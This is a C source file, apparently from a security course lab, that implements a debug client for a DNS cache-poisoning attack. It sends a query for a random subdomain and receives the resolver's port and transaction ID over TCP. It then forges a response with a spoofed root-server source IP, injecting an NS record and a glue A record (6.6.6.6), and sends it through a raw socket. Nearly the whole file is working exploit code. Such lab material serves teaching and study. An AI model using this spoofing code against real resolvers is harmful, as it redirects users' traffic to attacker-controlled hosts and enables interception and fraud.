// ex2_client_debug.c
// Debug version of attacker client:
// 1. send a legit DNS query for ww<rand>.attacker.cybercourse.example.com to the resolver
// 2. listen on TCP:12345 and receive {resolver_port, txid} from attacker-server
// 3. craft ONE spoofed DNS response pretending to be the root and send it via raw socket
// This is only for debugging correctness of the spoofed packet.

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

#include <ldns/ldns.h>

#define RESOLVER_IP        "192.168.1.203"
#define ROOT_IP            "192.168.1.204"
#define ATTACKER_SERVER_IP "192.168.1.201"
#define CONTROL_PORT       12345

#define DNS_TYPE_A   0x0001
#define DNS_CLASS_IN 0x0001

#define IP_HDR_LEN      20U
#define UDP_HDR_LEN     8U
#define DNS_MAX_WIRE    512U
#define MAX_PACKET_SIZE (IP_HDR_LEN + UDP_HDR_LEN + DNS_MAX_WIRE)

// ---------- struct exchanged over TCP ----------

typedef struct {
    uint16_t resolver_port;  // UDP source port used by resolver
    uint16_t txid;           // DNS transaction ID seen by attacker-server
} debug_info_t;

// ---------- helpers ----------

static uint16_t checksum16(const uint8_t *data, size_t len)
{
    uint32_t sum = 0U;
    size_t i = 0U;

    while (i + 1U < len) {
        uint16_t word = (uint16_t)(((uint32_t)data[i] << 8U) |
                                    (uint32_t)data[i + 1U]);
        sum += word;
        i += 2U;
    }

    if (i < len) {
        uint16_t last = (uint16_t)((uint32_t)data[i] << 8U);
        sum += last;
    }

    while ((sum >> 16U) != 0U) {
        sum = (sum & 0xFFFFU) + (sum >> 16U);
    }

    return (uint16_t)(~sum);
}

static uint16_t udp_checksum(const uint8_t src_ip[4],
                             const uint8_t dst_ip[4],
                             const uint8_t *udp,
                             size_t udp_len)
{
    uint8_t pseudo[12U];
    size_t pos = 0U;

    pseudo[pos++] = src_ip[0];
    pseudo[pos++] = src_ip[1];
    pseudo[pos++] = src_ip[2];
    pseudo[pos++] = src_ip[3];

    pseudo[pos++] = dst_ip[0];
    pseudo[pos++] = dst_ip[1];
    pseudo[pos++] = dst_ip[2];
    pseudo[pos++] = dst_ip[3];

    pseudo[pos++] = 0x00U;
    pseudo[pos++] = 17U;  // UDP
    pseudo[pos++] = (uint8_t)((udp_len >> 8) & 0xFFU);
    pseudo[pos++] = (uint8_t)(udp_len & 0xFFU);

    size_t total_len = sizeof(pseudo) + udp_len;
    uint8_t *buf = (uint8_t *)malloc(total_len);
    if (buf == NULL) {
        perror("malloc");
        exit(1);
    }

    memcpy(buf, pseudo, sizeof(pseudo));
    memcpy(buf + sizeof(pseudo), udp, udp_len);

    uint16_t result = checksum16(buf, total_len);
    free(buf);
    return result;
}

static uint16_t random_u16(void)
{
    return (uint16_t)(rand() & 0xFFFF);
}

// ---------- DNS building helpers ----------

// build a standard query wire for qname (A, IN)
static int build_dns_query(uint8_t **out_wire, size_t *out_len, const char *qname)
{
    ldns_rdf *name = ldns_dname_new_frm_str(qname);
    if (name == NULL) {
        fprintf(stderr, "ldns_dname_new_frm_str failed for %s\n", qname);
        return -1;
    }

    ldns_pkt *pkt = ldns_pkt_query_new(name,
                                       DNS_TYPE_A,
                                       DNS_CLASS_IN,
                                       LDNS_RD);
    if (pkt == NULL) {
        fprintf(stderr, "ldns_pkt_query_new failed\n");
        ldns_rdf_deep_free(name);
        return -1;
    }

    ldns_pkt_set_id(pkt, random_u16());

    ldns_status st = ldns_pkt2wire(out_wire, pkt, out_len);
    ldns_pkt_free(pkt);
    if (st != LDNS_STATUS_OK) {
        fprintf(stderr, "ldns_pkt2wire failed: %s\n",
                ldns_get_errorstr_by_id(st));
        return -1;
    }
    return 0;
}

// send one legit query to resolver
static void send_legit_query(const char *qname)
{
    uint8_t *wire = NULL;
    size_t wire_len = 0U;
    if (build_dns_query(&wire, &wire_len, qname) != 0) {
        return;
    }

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        free(wire);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53U);
    if (inet_pton(AF_INET, RESOLVER_IP, &addr.sin_addr) != 1) {
        perror("inet_pton");
        free(wire);
        close(sock);
        return;
    }

    if (sendto(sock, wire, wire_len, 0,
               (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
        perror("sendto");
    } else {
        printf("DEBUG: sent legit query for %s to resolver\n", qname);
    }

    free(wire);
    close(sock);
}

// build spoof DNS packet:
// Q: wwX.attacker... A?
// AUTH: qname IN NS www.attacker.cybercourse.example.com
// ADD:  www.attacker.cybercourse.example.com IN A 6.6.6.6
static int build_dns_spoof(uint8_t **out_wire,
                           size_t *out_len,
                           const char *qname,
                           uint16_t txid)
{
    ldns_rdf *name = ldns_dname_new_frm_str(qname);
    if (name == NULL) {
        fprintf(stderr, "ldns_dname_new_frm_str failed\n");
        return -1;
    }

    ldns_pkt *pkt = ldns_pkt_query_new(name,
                                       LDNS_RR_TYPE_A,
                                       LDNS_RR_CLASS_IN,
                                       0U);
    if (pkt == NULL) {
        fprintf(stderr, "ldns_pkt_query_new failed\n");
        ldns_rdf_deep_free(name);
        return -1;
    }

    ldns_pkt_set_id(pkt, txid);
    ldns_pkt_set_qr(pkt, 1U); // response
    ldns_pkt_set_aa(pkt, 1U); // authoritative

    // Authority: qname IN NS www.attacker.cybercourse.example.com
    char ns_text[256];
    snprintf(ns_text, sizeof(ns_text),
             "%s IN NS www.attacker.cybercourse.example.com",
             qname);

    ldns_rr *ns_rr = NULL;
    ldns_status st = ldns_rr_new_frm_str(&ns_rr, ns_text, 0, NULL, NULL);
    if (st != LDNS_STATUS_OK || ns_rr == NULL) {
        fprintf(stderr, "ldns_rr_new_frm_str for NS failed: %s\n",
                ldns_get_errorstr_by_id(st));
        ldns_pkt_free(pkt);
        return -1;
    }

    // Additional: www.attacker.cybercourse.example.com IN A 6.6.6.6
    const char *a_name = "www.attacker.cybercourse.example.com";
    char a_text[256];
    snprintf(a_text, sizeof(a_text),
             "%s IN A 6.6.6.6",
             a_name);

    ldns_rr *a_rr = NULL;
    st = ldns_rr_new_frm_str(&a_rr, a_text, 0, NULL, NULL);
    if (st != LDNS_STATUS_OK || a_rr == NULL) {
        fprintf(stderr, "ldns_rr_new_frm_str for A failed: %s\n",
                ldns_get_errorstr_by_id(st));
        ldns_rr_free(ns_rr);
        ldns_pkt_free(pkt);
        return -1;
    }

    ldns_pkt_push_rr(pkt, LDNS_SECTION_AUTHORITY, ns_rr);
    ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, a_rr);

    ldns_status status = ldns_pkt2wire(out_wire, pkt, out_len);
    ldns_pkt_free(pkt);

    if (status != LDNS_STATUS_OK) {
        fprintf(stderr, "ldns_pkt2wire failed: %s\n",
                ldns_get_errorstr_by_id(status));
        return -1;
    }
    return 0;
}

// build full IP+UDP+DNS packet
static int build_ip_udp_dns(uint8_t *buf,
                            size_t *out_len,
                            const uint8_t *dns_wire,
                            size_t dns_len,
                            uint16_t dst_port)
{
    if (dns_len > DNS_MAX_WIRE) {
        fprintf(stderr, "DNS wire too long\n");
        return -1;
    }

    uint8_t src_ip[4];
    uint8_t dst_ip[4];

    if (inet_pton(AF_INET, ROOT_IP, src_ip) != 1) {
        perror("inet_pton ROOT_IP");
        return -1;
    }
    if (inet_pton(AF_INET, RESOLVER_IP, dst_ip) != 1) {
        perror("inet_pton RESOLVER_IP");
        return -1;
    }

    size_t ip_total_len = (size_t)(IP_HDR_LEN + UDP_HDR_LEN + dns_len);
    if (ip_total_len > MAX_PACKET_SIZE) {
        fprintf(stderr, "packet too big\n");
        return -1;
    }

    memset(buf, 0, ip_total_len);

    uint8_t *ip = buf;
    uint8_t *udp = buf + IP_HDR_LEN;
    uint8_t *dns = udp + UDP_HDR_LEN;

    memcpy(dns, dns_wire, dns_len);

    // IP header
    ip[0] = 0x45; // v4, IHL=5
    ip[1] = 0x00;
    ip[2] = (uint8_t)((ip_total_len >> 8) & 0xFFU);
    ip[3] = (uint8_t)(ip_total_len & 0xFFU);
    ip[4] = 0x00; // identification
    ip[5] = 0x00;
    ip[6] = 0x40; // flags/fragment offset: don't fragment
    ip[7] = 0x00;
    ip[8] = 64;   // TTL
    ip[9] = 17;   // UDP
    ip[10] = 0x00;
    ip[11] = 0x00;

    ip[12] = src_ip[0];
    ip[13] = src_ip[1];
    ip[14] = src_ip[2];
    ip[15] = src_ip[3];
    ip[16] = dst_ip[0];
    ip[17] = dst_ip[1];
    ip[18] = dst_ip[2];
    ip[19] = dst_ip[3];

    uint16_t src_port = 53U;
    uint16_t udp_len = (uint16_t)(UDP_HDR_LEN + dns_len);

    udp[0] = (uint8_t)((src_port >> 8) & 0xFFU);
    udp[1] = (uint8_t)(src_port & 0xFFU);
    udp[2] = (uint8_t)((dst_port >> 8) & 0xFFU);
    udp[3] = (uint8_t)(dst_port & 0xFFU);
    udp[4] = (uint8_t)((udp_len >> 8) & 0xFFU);
    udp[5] = (uint8_t)(udp_len & 0xFFU);
    udp[6] = 0x00;
    udp[7] = 0x00;

    uint16_t ip_chksum = checksum16(ip, IP_HDR_LEN);
    ip[10] = (uint8_t)((ip_chksum >> 8) & 0xFFU);
    ip[11] = (uint8_t)(ip_chksum & 0xFFU);

    uint16_t udp_chksum = udp_checksum(src_ip, dst_ip, udp, udp_len);
    udp[6] = (uint8_t)((udp_chksum >> 8) & 0xFFU);
    udp[7] = (uint8_t)(udp_chksum & 0xFFU);

    *out_len = ip_total_len;
    return 0;
}

// receive resolver_port + txid from attacker-server over TCP
static int recv_debug_info(debug_info_t *info)
{
    int sockfd = -1;
    int connfd = -1;
    struct sockaddr_in servaddr, cli;
    socklen_t len;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket TCP");
        return -1;
    }

    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt SO_REUSEADDR");
        close(sockfd);
        return -1;
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(CONTROL_PORT);

    if (bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        perror("bind TCP");
        close(sockfd);
        return -1;
    }

    if (listen(sockfd, 1) != 0) {
        perror("listen TCP");
        close(sockfd);
        return -1;
    }

    printf("DEBUG: waiting for debug_info on TCP %d...\n", CONTROL_PORT);
    len = sizeof(cli);
    connfd = accept(sockfd, (struct sockaddr *)&cli, &len);
    if (connfd < 0) {
        perror("accept");
        close(sockfd);
        return -1;
    }

    ssize_t r = recv(connfd, info, sizeof(*info), MSG_WAITALL);
    if (r != (ssize_t)sizeof(*info)) {
        perror("recv debug_info");
        close(connfd);
        close(sockfd);
        return -1;
    }

    printf("DEBUG: got resolver_port=%u txid=0x%04x\n",
           (unsigned int)info->resolver_port,
           (unsigned int)info->txid);

    close(connfd);
    close(sockfd);
    return 0;
}

static void make_random_qname(char *buf, size_t buf_len)
{
    uint16_t rnd = random_u16();
    snprintf(buf, buf_len,
             "ww%u.attacker.cybercourse.example.com",
             (unsigned int)rnd);
}

int main(void)
{
    srand((unsigned int)time(NULL));

    // 1. create random subdomain under attacker domain
    char qname[256];
    make_random_qname(qname, sizeof(qname));
    printf("DEBUG: using qname = %s\n", qname);

    // 2. send legit query so resolver contacts attacker-server
    send_legit_query(qname);

    // 3. receive resolver_port + txid from attacker-server
    debug_info_t info;
    if (recv_debug_info(&info) != 0) {
        fprintf(stderr, "failed to receive debug info\n");
        return 1;
    }

    // 4. build spoofed DNS response matching that txid/port
    uint8_t *dns_wire = NULL;
    size_t dns_len = 0U;
    if (build_dns_spoof(&dns_wire, &dns_len, qname, info.txid) != 0) {
        fprintf(stderr, "failed to build spoof DNS\n");
        return 1;
    }

    uint8_t packet[MAX_PACKET_SIZE];
    size_t packet_len = 0U;
    if (build_ip_udp_dns(packet,
                         &packet_len,
                         dns_wire,
                         dns_len,
                         info.resolver_port) != 0) {
        fprintf(stderr, "failed to build IP+UDP packet\n");
        free(dns_wire);
        return 1;
    }
    free(dns_wire);

    // 5. send one spoofed packet via raw socket
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (raw_sock < 0) {
        perror("socket RAW");
        return 1;
    }

    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL,
                   &one, (socklen_t)sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(raw_sock);
        return 1;
    }

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(info.resolver_port);
    if (inet_pton(AF_INET, RESOLVER_IP, &dst.sin_addr) != 1) {
        perror("inet_pton dst");
        close(raw_sock);
        return 1;
    }

    if (sendto(raw_sock,
               packet,
               packet_len,
               0,
               (struct sockaddr *)&dst,
               (socklen_t)sizeof(dst)) < 0) {
        perror("sendto RAW");
        close(raw_sock);
        return 1;
    }

    printf("DEBUG: sent ONE spoofed response to resolver\n");

    close(raw_sock);
    return 0;
}
